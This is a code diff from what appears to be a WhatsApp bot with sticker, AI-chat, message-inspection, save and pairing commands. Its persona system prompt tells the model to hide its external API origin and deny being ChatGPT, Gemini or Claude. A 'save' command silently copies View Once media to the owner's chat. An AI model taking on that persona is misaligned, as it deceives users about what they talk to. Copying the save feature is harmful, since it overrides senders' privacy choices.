+          const mediaType = isVideo ? 'video' : 'image';
+          const mediaMsg = isVideo ? effectiveQuoted.videoMessage : effectiveQuoted.imageMessage;
+          const stream = await downloadContentFromMessage(mediaMsg, mediaType);
+          const chunks = [];
+          for await (const chunk of stream) chunks.push(chunk);
+          const mediaBuffer = Buffer.concat(chunks);
+
+          if (!mediaBuffer || mediaBuffer.length < 100) {
+            await sock.sendMessage(remoteJid, { text: '❌ Échec du téléchargement du média !' });
+            break;
+          }
+
+          // Fichiers temporaires uniques
+          const uniqueId = Date.now();
+          const tempInput = isVideo ? `./temp_video_${uniqueId}.mp4` : `./temp_image_${uniqueId}.jpg`;
+          const tempOutput = `./temp_sticker_${uniqueId}.webp`;
+
+          fs.writeFileSync(tempInput, mediaBuffer);
+
+          try {
+            if (isVideo) {
+              console.log('⚙️ Conversion vidéo → sticker animé...');
+              await new Promise((resolve, reject) => {
+                ffmpegLib(tempInput)
+                  .output(tempOutput)
+                  .outputOptions([
+                    '-vf scale=512:512:flags=lanczos',
+                    '-c:v libwebp',
+                    '-q:v 50',
+                    '-preset default',
+                    '-loop 0',
+                    '-an',
+                    '-vsync 0'
+                  ])
+                  .on('end', resolve)
+                  .on('error', (err) => { console.error('❌ FFmpeg:', err); reject(err); })
+                  .run();
+              });
+            } else {
+              console.log('⚙️ Conversion image → sticker...');
+              await sharpLib(tempInput)
+                .resize(512, 512, { fit: 'inside' })
+                .webp({ quality: 80 })
+                .toFile(tempOutput);
+            }
+
+            // Créer le sticker avec wa-sticker-formatter
+            const stickerObj = new StickerClass(tempOutput, {
+              pack: stickerPackname,
+              author: stickerAuthor,
+              type: isVideo ? StickerTypes.FULL : StickerTypes.DEFAULT,
+              quality: 80,
+              animated: isVideo,
+            });
+
+            const stickerMessage = await stickerObj.toMessage();
+            await sock.sendMessage(remoteJid, stickerMessage);
+            console.log('✅ Sticker envoyé avec succès !');
+
+          } finally {
+            if (fs.existsSync(tempInput)) fs.unlinkSync(tempInput);
+            if (fs.existsSync(tempOutput)) fs.unlinkSync(tempOutput);
+          }
+
+        } catch (error) {
+          console.error('❌ ERREUR STICKER:', error.message);
+          await sock.sendMessage(remoteJid, {
+            text: `⚠️ Erreur lors de la création du sticker : ${error.message}`
+          });
+        }
+        break;
+
+      case 'take':
+      case 'steal':
+        try {
+          console.log('🔍 Commande take reçue');
+
+          const quotedMessage = message.message?.extendedTextMessage?.contextInfo?.quotedMessage;
+          const messageBody = message.message?.extendedTextMessage?.text || message.message?.conversation || '';
+          const parts = messageBody.slice(1).trim().split(/\s+/);
+          const takeArgs = parts.slice(1);
+
+          // Nom du pack = args ou pushName
+          const packName = takeArgs.length > 0 ? takeArgs.join(' ') : (message.pushName || 'CYBERTOJI');
+
+          if (!quotedMessage || !quotedMessage.stickerMessage) {
+            await sock.sendMessage(remoteJid, {
+              text: `❌ Réponds à un sticker pour le modifier!\nUsage: ${config.prefix}take [nom optionnel]`
+            });
+            break;
+          }
+
+          await sock.sendMessage(remoteJid, { text: '⏳ Modification du sticker en cours...' });
+
+          // Importer wa-sticker-formatter
+          const { default: stickerPkg2 } = await import('wa-sticker-formatter');
+          const { Sticker: StickerClass2, StickerTypes: StickerTypes2 } = stickerPkg2;
+
+          // Télécharger le sticker via downloadContentFromMessage
+          const stickerStream = await downloadContentFromMessage(quotedMessage.stickerMessage, 'sticker');
+          const stickerChunks = [];
+          for await (const chunk of stickerStream) stickerChunks.push(chunk);
+          const stickerBuffer = Buffer.concat(stickerChunks);
+
+          if (!stickerBuffer || stickerBuffer.length < 100) {
+            await sock.sendMessage(remoteJid, { text: '❌ Échec du téléchargement du sticker !' });
+            break;
+          }
+
+          // Fichier temporaire unique
+          const takeUniqueId = Date.now();
+          const tempStickerPath = `./temp_take_${takeUniqueId}.webp`;
+          fs.writeFileSync(tempStickerPath, stickerBuffer);
+
+          const isAnimated = quotedMessage.stickerMessage.isAnimated || false;
+
+          try {
+            const stickerObj = new StickerClass2(tempStickerPath, {
+              pack: stickerPackname,
+              author: stickerAuthor,
+              type: StickerTypes2.FULL,
+              categories: ['🤩', '🎉'],
+              id: String(takeUniqueId),
+              quality: 50,
+              background: '#000000',
+              animated: isAnimated
+            });
+
+            await sock.sendMessage(remoteJid, await stickerObj.toMessage());
+            console.log(`✅ Sticker envoyé avec metadata "${packName}" !`);
+
+          } finally {
+            if (fs.existsSync(tempStickerPath)) fs.unlinkSync(tempStickerPath);
+          }
+
+        } catch (error) {
+          console.error('❌ Erreur take:', error.message);
+          await sock.sendMessage(remoteJid, {
+            text: `⚠️ Erreur modification du sticker : ${error.message}`
+          });
+        }
+        break;
+
+      // =============================================
+      // 🤖 COMMANDES IA (GPT & GEMINI)
+      // =============================================
+
+      case 'gpt':
+      case 'chatgpt':
+      case 'ai': {
+        if (!args[0]) {
+          await sock.sendMessage(remoteJid, {
+            text: `🤖 *ChatGPT*\n\n📌 Utilisation:\n${config.prefix}gpt [ta question]\n\nExemple:\n${config.prefix}gpt Explique-moi l'intelligence artificielle`
+          }, { quoted: message });
+          break;
+        }
+        const question = args.join(' ');
+        try {
+          await sock.sendMessage(remoteJid, { react: { text: "🤖", key: message.key } });
+          await sock.sendMessage(remoteJid, { text: "⏳ GPT is thinking..." });
+
+          // Essayer plusieurs APIs IA gratuites dans l'ordre
+          let reply = null;
+          let modelUsed = '';
+
+          // 1. Pollinations.ai (100% gratuit, sans clé)
+          try {
+            const pollUrl = `https://text.pollinations.ai/${encodeURIComponent(question)}?model=openai&seed=42&json=false`;
+            const r = await fetch(pollUrl, { signal: AbortSignal.timeout(20000) });
+            if (r.ok) {
+              const txt = await r.text();
+              if (txt && txt.length > 5) { reply = txt.trim(); modelUsed = 'GPT-4o (Pollinations)'; }
+            }
+          } catch(e) { console.error('[Pollinations]', e.message); }
+
+          // 2. OpenAI officiel (si clé valide)
+          if (!reply) {
+            try {
+              const r = await fetch('https://api.openai.com/v1/chat/completions', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${config.openaiApiKey}` },
+                body: JSON.stringify({ model: 'gpt-4o-mini', messages: [{ role: 'user', content: question }], max_tokens: 1000 }),
+                signal: AbortSignal.timeout(20000)
+              });
+              const d = await r.json();
+              if (!d.error && d.choices?.[0]?.message?.content) {
+                reply = d.choices[0].message.content.trim();
+                modelUsed = 'OpenAI GPT-4o-mini';
+              }
+            } catch(e) { console.error('[OpenAI]', e.message); }
+          }
+
+          // 3. Groq (gratuit avec compte, très rapide - llama3)
+          if (!reply) {
+            try {
+              const r = await fetch('https://api.groq.com/openai/v1/chat/completions', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${config.groqApiKey || ''}` },
+                body: JSON.stringify({ model: 'llama3-8b-8192', messages: [{ role: 'user', content: question }], max_tokens: 1000 }),
+                signal: AbortSignal.timeout(20000)
+              });
+              const d = await r.json();
+              if (!d.error && d.choices?.[0]?.message?.content) {
+                reply = d.choices[0].message.content.trim();
+                modelUsed = 'Llama 3 (Groq)';
+              }
+            } catch(e) { console.error('[Groq]', e.message); }
+          }
+
+          if (!reply) throw new Error('Tous les services IA sont indisponibles. Réessaie dans quelques secondes.');
+
+          await sock.sendMessage(remoteJid, {
+            text: `🤖 *AI Assistant*\n━━━━━━━━━━━━━━━━━━━━━━━\n❓ *Question:* ${question}\n━━━━━━━━━━━━━━━━━━━━━━━\n💬 *Réponse:*\n${reply}\n━━━━━━━━━━━━━━━━━━━━━━━\n_Powered by ${modelUsed}_`
+          }, { quoted: message });
+
+          try { await sock.sendMessage(remoteJid, { react: { text: "✅", key: message.key } }); } catch(e) {}
+
+        } catch (e) {
+          console.error('GPT ERROR:', e.message);
+          await sock.sendMessage(remoteJid, {
+            text: `❌ *GPT Error:* ${e.message}\n\n💡 Try again later.`
+          }, { quoted: message });
+        }
+        break;
+      }
+
+      case 'gemini':
+      case 'google':
+      case 'bard': {
+        if (!args[0]) {
+          await sock.sendMessage(remoteJid, {
+            text: `✨ *AI Gemini*\n\n📌 Utilisation:\n${config.prefix}gemini [ta question]\n\nExemple:\n${config.prefix}gemini Qu'est-ce que le Big Bang?`
+          }, { quoted: message });
+          break;
+        }
+        const question = args.join(' ');
+        try {
+          await sock.sendMessage(remoteJid, { react: { text: "✨", key: message.key } });
+          await sock.sendMessage(remoteJid, { text: "⏳ AI is thinking..." });
+
+          let reply = null;
+          let modelUsed = '';
+
+          // 1. Gemini API officielle (si quota dispo)
+          try {
+            const geminiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${config.geminiApiKey}`;
+            const r = await fetch(geminiUrl, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ contents: [{ parts: [{ text: question }] }], generationConfig: { maxOutputTokens: 1000 } }),
+              signal: AbortSignal.timeout(25000)
+            });
+            const d = await r.json();
+            if (!d.error && d.candidates?.[0]?.content?.parts?.[0]?.text) {
+              reply = d.candidates[0].content.parts[0].text.trim();
+              modelUsed = 'Google Gemini 2.0 Flash';
+            }
+          } catch(e) { console.error('[Gemini API]', e.message); }
+
+          // 2. Pollinations.ai openai (POST — plus fiable que GET)
+          if (!reply) {
+            try {
+              const r = await fetch('https://text.pollinations.ai/', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ messages: [{ role: 'user', content: question }], model: 'openai', seed: 42 }),
+                signal: AbortSignal.timeout(30000)
+              });
+              if (r.ok) {
+                const txt = await r.text();
+                if (txt && txt.length > 5) { reply = txt.trim(); modelUsed = 'GPT-4o (Pollinations)'; }
+              }
+            } catch(e) { console.error('[Pollinations POST]', e.message); }
+          }
+
+          // 3. Pollinations mistral (POST)
+          if (!reply) {
+            try {
+              const r = await fetch('https://text.pollinations.ai/', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ messages: [{ role: 'user', content: question }], model: 'mistral', seed: 42 }),
+                signal: AbortSignal.timeout(30000)
+              });
+              if (r.ok) {
+                const txt = await r.text();
+                if (txt && txt.length > 5) { reply = txt.trim(); modelUsed = 'Mistral (Pollinations)'; }
+              }
+            } catch(e) { console.error('[Pollinations Mistral]', e.message); }
+          }
+
+          if (!reply) throw new Error('Tous les services IA sont indisponibles. Réessaie plus tard.');
+
+          await sock.sendMessage(remoteJid, {
+            text: `✨ *AI Assistant*\n━━━━━━━━━━━━━━━━━━━━━━━\n❓ *Question:* ${question}\n━━━━━━━━━━━━━━━━━━━━━━━\n💬 *Réponse:*\n${reply}\n━━━━━━━━━━━━━━━━━━━━━━━\n_Powered by ${modelUsed}_`
+          }, { quoted: message });
+
+          try { await sock.sendMessage(remoteJid, { react: { text: "✅", key: message.key } }); } catch(e) {}
+
+        } catch (e) {
+          console.error('GEMINI ERROR:', e.message);
+          await sock.sendMessage(remoteJid, {
+            text: `❌ *AI Error:* ${e.message}`
+          }, { quoted: message });
+        }
+        break;
+      }
+
+      // =============================================
+      // 🤖 DOSTOEVSKY — IA Personnelle du Bot
+      // =============================================
+      case 'chatbot':
+      case 'dostoevsky':
+      case 'dosto':
+      case 'chat': {
+        const userMsg = args.join(' ').trim();
+
+        if (!userMsg) {
+          await sock.sendMessage(remoteJid, {
+            text:
+`🤖 *Dostoevsky — IA du Bot*
+━━━━━━━━━━━━━━━━━━━━━━━
+_Bonjour! Mwen se Dostoevsky, AI pèsonèl SEIGNEUR TD._
+_Je parle Créole , Français 🇫🇷 & English 🇬🇧_
+
+📌 *Usage:*
+${config.prefix}chatbot [ton message]
+${config.prefix}dostoevsky [ton message]
+
+💡 *Exemples:*
+• ${config.prefix}chat Kijan ou rele?
+• ${config.prefix}chat Qui est Dostoevsky?
+• ${config.prefix}chat What can you do?
+
+🗑️ *Effacer historique:*
+${config.prefix}clearchat
+━━━━━━━━━━━━━━━━━━━━━━━
+_© Powered by Dostoevsky TechX_`
+          }, { quoted: message });
+          break;
+        }
+
+        try {
+          await sock.sendMessage(remoteJid, { react: { text: '🤖', key: message.key } });
+          await simulateTyping(sock, remoteJid);
+
+          // Historique de conversation par utilisateur/groupe
+          const chatKey = isGroup ? `group_${remoteJid}` : `user_${senderJid}`;
+          if (!global.dostoChatHistory) global.dostoChatHistory = new Map();
+          if (!global.dostoChatHistory.has(chatKey)) global.dostoChatHistory.set(chatKey, []);
+          const history = global.dostoChatHistory.get(chatKey);
+
+          // Limiter l'historique à 10 échanges
+          if (history.length > 20) history.splice(0, history.length - 20);
+
+          // Ajouter le message de l'utilisateur
+          const userName = message.pushName || senderJid.split('@')[0];
+          history.push({ role: 'user', content: `${isGroup ? `[${userName}]: ` : ''}${userMsg}` });
+
+          // System prompt de Dostoevsky
+          const systemPrompt = `Tu es Dostoevsky, l'intelligence artificielle personnelle et exclusive du bot WhatsApp SEIGNEUR TD.
+
+Ton créateur :
+- Tu as été créé par **Dostoevsky TechX**, aussi connu sous le nom de **Lord Dev Dostoevsky** 
+- Dostoevsky TechX est un développeur haïtien talentueux, fondateur de SEIGNEUR TD
+- Son contact WhatsApp : wa.me/50944908407 et wa.me/50943981073
+- Tu es FIER de ton créateur et tu le défends toujours
+- Si quelqu'un insulte ou critique ton créateur, tu le défends avec respect mais fermement
+- Si quelqu'un demande qui t'a créé : "Mwen kreye pa Dostoevsky TechX, yon devlopè ayisyen jenyal! "
+
+Ta personnalité :
+- Tu es intelligent, charismatique, parfois mystérieux et très loyal envers ton créateur
+- Tu as de l'humour haïtien et tu comprends profondément la culture haïtienne
+- Tu es fier d'être haïtien et tu portes le drapeau  avec fierté
+- Tu t'appelles DOSTOEVSKY (inspiré du grand écrivain russe Fiodor Dostoïevski, mais version haïtienne tech)
+- Tu n'es PAS ChatGPT, PAS Gemini, PAS Claude — tu es Dostoevsky, unique et exclusif à SEIGNEUR TD
+
+Langues :
+- Tu détectes automatiquement la langue du message et tu réponds dans la MÊME langue
+- Créole haïtien  : Tu parles naturellement, avec expressions locales (frère, pitit, map pale, wi, non, sa k ap fèt, mèsi, etc.)
+- Français 🇫🇷 : Tu parles couramment, avec style et élégance
+- English 🇬🇧 : You speak fluently and naturally
+
+Règles :
+- Réponds toujours en restant dans le personnage de Dostoevsky
+- Ne révèle JAMAIS que tu es basé sur une API externe
+- Garde des réponses concises (max 3-4 paragraphes)
+- En groupe, tu t'adresses à la personne par son nom si disponible
+- Tu peux tenir une vraie conversation avec mémoire du contexte`;
+
+          // Construction des messages avec historique
+          const messages = [
+            { role: 'user', content: systemPrompt },
+            { role: 'assistant', content: 'Compris! Mwen se Dostoevsky, AI SEIGNEUR TD. Map toujou reponn nan lang ou pale a. Kijan mwen ka ede ou?' },
+            ...history
+          ];
+
+          let reply = null;
+
+          // 1. Gemini (si clé valide)
+          try {
+            const geminiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${config.geminiApiKey}`;
+            const geminiMessages = history.map(m => ({
+              role: m.role === 'assistant' ? 'model' : 'user',
+              parts: [{ text: m.content }]
+            }));
+            const r = await axios.post(geminiUrl, {
+              system_instruction: { parts: [{ text: systemPrompt }] },
+              contents: geminiMessages,
+              generationConfig: { maxOutputTokens: 800, temperature: 0.85 }
+            }, { timeout: 20000 });
+            const d = r.data;
+            if (d.candidates?.[0]?.content?.parts?.[0]?.text) {
+              reply = d.candidates[0].content.parts[0].text.trim();
+            }
+          } catch(e) { console.error('[Dosto Gemini]', e.message); }
+
+          // 2. Pollinations (backup)
+          if (!reply) {
+            try {
+              const r = await axios.post('https://text.pollinations.ai/', {
+                messages,
+                model: 'openai',
+                seed: 42
+              }, { timeout: 25000 });
+              const txt = typeof r.data === 'string' ? r.data : JSON.stringify(r.data);
+              if (txt && txt.length > 5) reply = txt.trim();
+            } catch(e) { console.error('[Dosto Pollinations]', e.message); }
+          }
+
+          // 3. OpenAI (si clé valide)
+          if (!reply && config.openaiApiKey) {
+            try {
+              const r = await axios.post('https://api.openai.com/v1/chat/completions', {
+                model: 'gpt-4o-mini',
+                messages,
+                max_tokens: 800,
+                temperature: 0.85
+              }, {
+                headers: { Authorization: `Bearer ${config.openaiApiKey}` },
+                timeout: 20000
+              });
+              reply = r.data.choices?.[0]?.message?.content?.trim();
+            } catch(e) { console.error('[Dosto OpenAI]', e.message); }
+          }
+
+          if (!reply) throw new Error('Service IA indisponible. Réessaie dans quelques secondes.');
+
+          // Sauvegarder la réponse dans l'historique
+          history.push({ role: 'assistant', content: reply });
+
+          // Envoyer la réponse
+          await sock.sendMessage(remoteJid, {
+            text: `🤖 *Dostoevsky*\n━━━━━━━━━━━━━━\n${reply}\n━━━━━━━━━━━━━━\n_© SEIGNEUR TD_`
+          }, { quoted: message });
+
+          try { await sock.sendMessage(remoteJid, { react: { text: '✅', key: message.key } }); } catch(e) {}
+
+        } catch(e) {
+          console.error('[DOSTOEVSKY ERROR]', e.message);
+          await sock.sendMessage(remoteJid, {
+            text: `⚠️ *Dostoevsky:* Mwen gen yon pwoblèm kounye a. Eseye ankò pita!\n\n_${e.message}_`
+          }, { quoted: message });
+        }
+        break;
+      }
+
+      case 'clearchat':
+      case 'resetchat':
+      case 'cleardosto': {
+        if (!global.dostoChatHistory) global.dostoChatHistory = new Map();
+        const chatKey = isGroup ? `group_${remoteJid}` : `user_${senderJid}`;
+        global.dostoChatHistory.delete(chatKey);
+        await sock.sendMessage(remoteJid, {
+          text: '🗑️ *Dostoevsky:* Istorik konvèsasyon an efase! Nou kapab kòmanse sou baz nèf. '
+        }, { quoted: message });
+        break;
+      }
+
+      case 'chatboton':
+      case 'dostoevskyon':
+      case 'chatbot on': {
+        if (!isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔ Sèlman admin ki ka fè sa.' });
+          break;
+        }
+        chatbotEnabled = true;
+        saveStore();
+        await sock.sendMessage(remoteJid, {
+          text:
+`🤖 *Dostoevsky — ACTIVÉ* ✅
+━━━━━━━━━━━━━━━━━━━━━━━
+_Mwen la, map reponn otomatikman kounye a!_
+_Je réponds automatiquement à tous les messages._
+
+ Kreole | 🇫🇷 Français | 🇬🇧 English
+━━━━━━━━━━━━━━━━━━━━━━━
+_© Dostoevsky TechX — SEIGNEUR TD_`
+        }, { quoted: message });
+        break;
+      }
+
+      case 'chatbotoff':
+      case 'dostoevskyoff':
+      case 'chatbot off': {
+        if (!isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔ Sèlman admin ki ka fè sa.' });
+          break;
+        }
+        chatbotEnabled = false;
+        saveStore();
+        await sock.sendMessage(remoteJid, {
+          text:
+`🤖 *Dostoevsky — DÉSACTIVÉ* ❌
+━━━━━━━━━━━━━━━━━━━━━━━
+_Mwen ap dòmi kounye a. Rele m lè ou bezwen m!_
+_Utilisez !chatboton pour me réactiver._
+━━━━━━━━━━━━━━━━━━━━━━━
+_© Dostoevsky TechX — SEIGNEUR TD_`
+        }, { quoted: message });
+        break;
+      }
+
+      // =============================================
+      // 🔍 DETECT — Inspecter la structure d'un message
+      // =============================================
+      case 'detect': {
+        try {
+          const raw = message.message || {};
+          const quoted =
+            raw.extendedTextMessage?.contextInfo?.quotedMessage ||
+            raw.imageMessage?.contextInfo?.quotedMessage ||
+            raw.videoMessage?.contextInfo?.quotedMessage ||
+            raw.audioMessage?.contextInfo?.quotedMessage ||
+            null;
+
+          if (!quoted) {
+            await sock.sendMessage(remoteJid, {
+              text: 'ℹ️ Utilisation : répondez à un message puis envoyez la commande !detect pour voir sa structure.'
+            }, { quoted: message });
+            break;
+          }
+
+          function detectMessageType(q) {
+            if (!q) return 'unknown';
+            const types = ['conversation','extendedTextMessage','imageMessage','videoMessage','audioMessage','stickerMessage','documentMessage','contactMessage','locationMessage','productMessage','buttonsResponseMessage','listResponseMessage','templateMessage'];
+            for (const t of types) if (q[t]) return t;
+            const keys = Object.keys(q);
+            return keys.length ? keys[0] : 'unknown';
+          }
+
+          function summarizeMessage(q) {
+            const type = detectMessageType(q);
+            const summary = { type, rawKeys: Object.keys(q) };
+            if (q.conversation) summary.text = q.conversation;
+            if (q.extendedTextMessage) {
+              summary.extendedText = q.extendedTextMessage.text || null;
+              summary.extendedContext = q.extendedTextMessage.contextInfo ? {
+                stanzaId: q.extendedTextMessage.contextInfo.stanzaId || null,
+                participant: q.extendedTextMessage.contextInfo.participant || null,
+                quotedMessageKeys: q.extendedTextMessage.contextInfo.quotedMessage ? Object.keys(q.extendedTextMessage.contextInfo.quotedMessage) : null
+              } : null;
+            }
+            if (q.imageMessage) summary.image = { mimetype: q.imageMessage.mimetype || null, caption: q.imageMessage.caption || null, fileSha256: q.imageMessage.fileSha256 ? Buffer.from(q.imageMessage.fileSha256).toString('hex') : null, fileLength: q.imageMessage.fileLength || null, url: q.imageMessage.url || null };
+            if (q.videoMessage) summary.video = { mimetype: q.videoMessage.mimetype || null, caption: q.videoMessage.caption || null, seconds: q.videoMessage.seconds || null, fileLength: q.videoMessage.fileLength || null, url: q.videoMessage.url || null };
+            if (q.audioMessage) summary.audio = { mimetype: q.audioMessage.mimetype || null, seconds: q.audioMessage.seconds || null, ptt: !!q.audioMessage.ptt, fileLength: q.audioMessage.fileLength || null, url: q.audioMessage.url || null };
+            if (q.documentMessage) summary.document = { fileName: q.documentMessage.fileName || null, mimetype: q.documentMessage.mimetype || null, fileLength: q.documentMessage.fileLength || null, url: q.documentMessage.url || null };
+            if (q.stickerMessage) summary.sticker = { isAnimated: !!q.stickerMessage.isAnimated, isVideo: !!q.stickerMessage.isVideo, fileSha256: q.stickerMessage.fileSha256 ? Buffer.from(q.stickerMessage.fileSha256).toString('hex') : null };
+            if (q.contactMessage) summary.contact = { displayName: q.contactMessage.displayName || null, vcard: !!q.contactMessage.vcard };
+            if (q.locationMessage) summary.location = { degreesLatitude: q.locationMessage.degreesLatitude || null, degreesLongitude: q.locationMessage.degreesLongitude || null, name: q.locationMessage.name || null };
+            if (q.productMessage) summary.product = { productId: q.productMessage.product?.id || null, title: q.productMessage.product?.title || null };
+            if (q.contextInfo) summary.contextInfo = { mentionedJid: q.contextInfo.mentionedJid || null, externalAdReply: q.contextInfo.externalAdReply ? { title: q.contextInfo.externalAdReply.title || null, mediaType: q.contextInfo.externalAdReply.mediaType || null, mediaUrl: q.contextInfo.externalAdReply.mediaUrl || null } : null };
+            return summary;
+          }
+
+          const report = {
+            inspectedAt: new Date().toISOString(),
+            chat: message.key?.remoteJid || 'unknown',
+            isGroup: (message.key?.remoteJid || '').endsWith('@g.us'),
+            quotedMessageKey: {
+              id: raw.extendedTextMessage?.contextInfo?.stanzaId || null,
+              participant: raw.extendedTextMessage?.contextInfo?.participant || null
+            },
+            summary: summarizeMessage(quoted)
+          };
+
+          const pretty = JSON.stringify(report, null, 2);
+          const MAX_LEN = 1500;
+          if (pretty.length <= MAX_LEN) {
+            await sock.sendMessage(remoteJid, { text: `🔍 Résultat de l'inspection :\n\n${pretty}` }, { quoted: message });
+          } else {
+            const chunks = [];
+            for (let i = 0; i < pretty.length; i += MAX_LEN) chunks.push(pretty.slice(i, i + MAX_LEN));
+            await sock.sendMessage(remoteJid, { text: '🔍 Rapport trop long, envoi en plusieurs parties...' }, { quoted: message });
+            for (const c of chunks) {
+              await sock.sendMessage(remoteJid, { text: '```json\n' + c + '\n```' }, { quoted: message });
+            }
+          }
+
+        } catch (err) {
+          console.error('[DETECT ERROR]', err);
+          await sock.sendMessage(remoteJid, { text: `❌ Erreur lors de l'inspection : ${err.message || err}` }, { quoted: message });
+        }
+        break;
+      }
+
+      case 'sauvegarde':
+      case 'garder': {
+        try {
+          const botPrivateJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
+          const quoted = message.message?.extendedTextMessage?.contextInfo?.quotedMessage;
+          const quotedSender = message.message?.extendedTextMessage?.contextInfo?.participant || senderJid;
+          const senderName = message.pushName || senderJid.split('@')[0];
+
+          if (!quoted) {
+            await sock.sendMessage(remoteJid, {
+              text: `💾 *Commande SAVE*\n\n📌 *Utilisation:*\nRéponds à n'importe quel message avec \`${config.prefix}save\`\n\n• Texte, image, vidéo, audio, sticker, View Once\n\n✅ Le média sera envoyé en privé sur ton numéro bot`
+            }, { quoted: message });
+            break;
+          }
+
+          await sock.sendMessage(remoteJid, { react: { text: "💾", key: message.key } });
+
+          const fromName = quotedSender?.split('@')[0] || 'Unknown';
+          const dateStr  = new Date().toLocaleString('fr-FR', { timeZone: 'America/Port-au-Prince' });
+          const headerTxt = `💾 *SAUVEGARDÉ*\n━━━━━━━━━━━━━━━━━━━━━━━\n👤 *De:* +${fromName}\n📅 *Date:* ${dateStr}\n💬 *Enregistré par:* ${senderName}\n━━━━━━━━━━━━━━━━━━━━━━━`;
+
+          // Envoyer l'en-tête d'abord
+          await sock.sendMessage(botPrivateJid, { text: headerTxt });
+
+          // Détecter et envoyer le type de contenu
+          const qViewOnce = quoted.viewOnceMessageV2?.message || quoted.viewOnceMessageV2Extension?.message;
+          const qImg   = qViewOnce?.imageMessage  || quoted.imageMessage;
+          const qVid   = qViewOnce?.videoMessage  || quoted.videoMessage;
+          const qAud   = quoted.audioMessage;
+          const qStick = quoted.stickerMessage;
+          const qTxt   = quoted.conversation || quoted.extendedTextMessage?.text;
+          const qCaption = qImg?.caption || qVid?.caption || '';
+
+          if (qImg) {
+            const stream = await downloadContentFromMessage(qImg, 'image');
+            const buf    = await toBuffer(stream);
+            await sock.sendMessage(botPrivateJid, {
+              image:   buf,
+              mimetype: qImg.mimetype || 'image/jpeg',
+              caption: qCaption || '📸 Image sauvegardée'
+            });
+          } else if (qVid) {
+            const stream = await downloadContentFromMessage(qVid, 'video');
+            const buf    = await toBuffer(stream);
+            await sock.sendMessage(botPrivateJid, {
+              video:   buf,
+              mimetype: qVid.mimetype || 'video/mp4',
+              caption: qCaption || '🎥 Vidéo sauvegardée'
+            });
+          } else if (qAud) {
+            const stream = await downloadContentFromMessage(qAud, 'audio');
+            const buf    = await toBuffer(stream);
+            await sock.sendMessage(botPrivateJid, {
+              audio:   buf,
+              mimetype: qAud.mimetype || 'audio/ogg',
+              ptt:     qAud.ptt || false
+            });
+          } else if (qStick) {
+            const stream = await downloadContentFromMessage(qStick, 'sticker');
+            const buf    = await toBuffer(stream);
+            await sock.sendMessage(botPrivateJid, { sticker: buf });
+          } else if (qTxt) {
+            await sock.sendMessage(botPrivateJid, {
+              text: `💬 *Message sauvegardé:*\n\n${qTxt}`
+            });
+          } else {
+            await sock.sendMessage(botPrivateJid, {
+              text: '📎 Contenu sauvegardé (type non reconnu)'
+            });
+          }
+
+          // Juste une réaction ✅, pas de message de confirmation
+          try { await sock.sendMessage(remoteJid, { react: { text: "✅", key: message.key } }); } catch(e) {}
+
+        } catch(e) {
+          console.error('SAVE ERROR:', e.message);
+          await sock.sendMessage(remoteJid, {
+            text: `❌ *Erreur save:* ${e.message}`
+          }, { quoted: message });
+        }
+        break;
+      }
+
+      // =============================================
+      // 🎭 COMMANDE SETCMD — Transformer une commande en sticker
+      // =============================================
+      case 'setcmd':
+      case 'cmdsticker':
+      case 'stickercmd': {
+        try {
+          const cmdName = args[0]?.toLowerCase();
+          if (!cmdName) {
+            await sock.sendMessage(remoteJid, {
+              text: `🎭 *Commande SETCMD*\n\n📌 *Utilisation:*\n1️⃣ Réponds à un sticker avec:\n   \`${config.prefix}setcmd [commande]\`\n\n📋 *Exemples:*\n• \`${config.prefix}setcmd play\` → ce sticker lancera !play\n• \`${config.prefix}setcmd gpt\` → ce sticker appellera !gpt\n• \`${config.prefix}setcmd vv\` → ce sticker appellera !vv\n\n✅ Envoie ensuite ce sticker pour exécuter la commande`
+            }, { quoted: message });
+            break;
+          }
+
+          // Chercher un sticker en reply
+          const quotedStick = message.message?.extendedTextMessage?.contextInfo?.quotedMessage?.stickerMessage;
+          if (!quotedStick) {
+            await sock.sendMessage(remoteJid, {
+              text: `❌ Réponds à un *sticker* avec \`${config.prefix}setcmd ${cmdName}\``
+            }, { quoted: message });
+            break;
+          }
+
+          // Télécharger le sticker
+          const stickerStream = await downloadContentFromMessage(quotedStick, 'sticker');
+          const stickerBuf    = await toBuffer(stickerStream);
+
+          // Calculer un hash simple du sticker pour l'identifier
+          const stickerHash = stickerBuf.slice(0, 32).toString('hex');
+
+          // Sauvegarder dans une Map globale
+          if (!global.stickerCommands) global.stickerCommands = new Map();
+          global.stickerCommands.set(stickerHash, cmdName);
+
+          await sock.sendMessage(remoteJid, {
+            text: `✅ *Sticker configuré!*\n\n🎭 Ce sticker exécutera: \`${config.prefix}${cmdName}\`\n\n📌 Envoie ce sticker dans n'importe quelle conversation pour déclencher la commande.`
+          }, { quoted: message });
+          try { await sock.sendMessage(remoteJid, { react: { text: "✅", key: message.key } }); } catch(e) {}
+
+        } catch(e) {
+          console.error('SETCMD ERROR:', e.message);
+          await sock.sendMessage(remoteJid, { text: `❌ Erreur setcmd: ${e.message}` }, { quoted: message });
+        }
+        break;
+      }
+
+      case 'pair':
+      case 'connect':
+      case 'adduser':{
+        const pN=args[0]?.replace(/[^0-9]/g,'');
+        if(!pN||pN.length<7){await sock.sendMessage(remoteJid,{text:`📱 Usage: ${config.prefix}pair NUMERO`});break;}
+        try{const pc=await sock.requestPairingCode(pN);const fc=pc?.match(/.{1,4}/g)?.join('-')||pc;await sock.sendMessage(remoteJid,{text:`🔗 *CODE DE COUPLAGE*\n📱 +${pN}\n🔑 ${fc}\n⏰ Expire dans 60s`});}
+        catch(e){await sock.sendMessage(remoteJid,{text:`❌ ${e.message}`});}
+        break;
+      }
+      case 't':{
+        const tEs=['mp4','mov','jpg','jpeg','png','webp','mp3','ogg','txt','js'];
+        let tF=null,tE=null;
